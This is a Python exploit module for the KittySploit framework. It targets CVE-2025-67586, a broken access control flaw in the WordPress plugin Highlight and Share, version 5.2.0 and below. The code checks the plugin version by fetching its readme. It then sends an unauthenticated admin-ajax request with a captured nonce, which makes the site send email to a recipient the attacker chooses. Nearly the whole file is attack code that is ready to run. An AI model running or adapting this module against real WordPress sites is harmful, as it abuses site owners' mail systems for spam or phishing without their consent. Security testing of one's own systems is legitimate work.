import json

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "WordPress Highlight and Share <= 5.2.0 Broken Access Control",
        "description": (
            "Abuses an unauthenticated AJAX action in Highlight and Share to trigger "
            "the 'Share via Email' flow when a valid post nonce is known."
        ),
        "author": ["KittySploit Team",],
        "cve": "CVE-2025-67586",
        "references": [
            "https://wordpress.org/plugins/highlight-and-share/",
            "https://nvd.nist.gov/vuln/detail/CVE-2025-67586",
        ],
        "tags": ["wordpress", "unauthenticated", "broken-access-control", "email-abuse"],
    }

    post_id = OptInteger(1, "Target WordPress post ID used in the email share flow", required=True)
    nonce = OptString("", "Valid nonce captured from the public Share via Email request", required=True)
    to_email = OptString("attacker@example.com", "Recipient email address", required=True)
    subject = OptString("PoC", "Email subject to send through the vulnerable action", required=False)
    share_text = OptString("POC test", "Email body/share text", required=False)
    permalink = OptString("", "Post permalink (auto-built from post_id when empty)", required=False)
    email_share_type = OptString("selection", "Share type sent to the plugin", required=False)

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(self.path)

    def _plugin_readme_path(self) -> str:
        return self.wp_plugin_path(self._wp_base(), "highlight-and-share", "readme.txt")

    def _admin_ajax_path(self) -> str:
        return f"{self._wp_base()}/wp-admin/admin-ajax.php"

    def _target_permalink(self) -> str:
        user_permalink = (self.permalink or "").strip()
        if user_permalink:
            return user_permalink
        base = self._wp_base()
        if base == "/":
            return f"/?p={int(self.post_id)}"
        return f"{base}/?p={int(self.post_id)}"

    def _is_vulnerable_version(self, version: str) -> bool:
        try:
            return self.wp_version_to_tuple(version) <= (5, 2, 0)
        except Exception:
            return False

    def check(self):
        try:
            response = self.http_request(
                method="GET",
                path=self._plugin_readme_path(),
                allow_redirects=True,
                timeout=10,
            )
        except Exception as e:
            return {"vulnerable": False, "reason": f"Readme request failed: {e}", "confidence": "low"}

        if not response or response.status_code != 200:
            return {"vulnerable": False, "reason": "Plugin readme not accessible", "confidence": "low"}

        version = self.wp_extract_version_from_readme(response.text or "")
        if not version:
            return {"vulnerable": False, "reason": "Unable to determine plugin version", "confidence": "low"}

        if not self._is_vulnerable_version(version):
            return {
                "vulnerable": False,
                "reason": f"Highlight and Share version {version} appears patched (> 5.2.0)",
                "confidence": "high",
            }

        return {
            "vulnerable": True,
            "reason": f"Highlight and Share version {version} is within vulnerable range",
            "confidence": "high",
        }

    def run(self):
        print_status("Checking Highlight and Share plugin version...")
        check_result = self.check()
        if not check_result.get("vulnerable"):
            print_error(check_result.get("reason", "Target does not appear vulnerable"))
            return False
        print_success(check_result["reason"])

        payload = {
            "action": "has_email_form_submission",
            "formData[postId]": str(int(self.post_id)),
            "formData[permalink]": self._target_permalink(),
            "formData[nonce]": self.nonce,
            "formData[toEmail]": self.to_email,
            "formData[subject]": self.subject,
            "formData[shareText]": self.share_text,
            "formData[emailShareType]": self.email_share_type,
        }

        response = self.http_request(
            method="POST",
            path=self._admin_ajax_path(),
            data=payload,
            headers={
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Accept": "application/json, text/javascript, */*; q=0.01",
            },
            allow_redirects=False,
            timeout=15,
        )

        if not response:
            print_error("No response from admin-ajax endpoint")
            return False

        body = response.text or ""
        try:
            data = json.loads(body)
        except Exception:
            data = None

        if response.status_code == 200 and isinstance(data, dict) and data.get("success") is True:
            message = (data.get("data") or {}).get("message_body")
            print_success("Unauthenticated share request accepted by the target")
            if message:
                print_info(f"Server message: {message}")
            return True

        print_error(f"Request rejected or unexpected response (HTTP {response.status_code})")
        if body:
            print_info(body[:500])
        return False
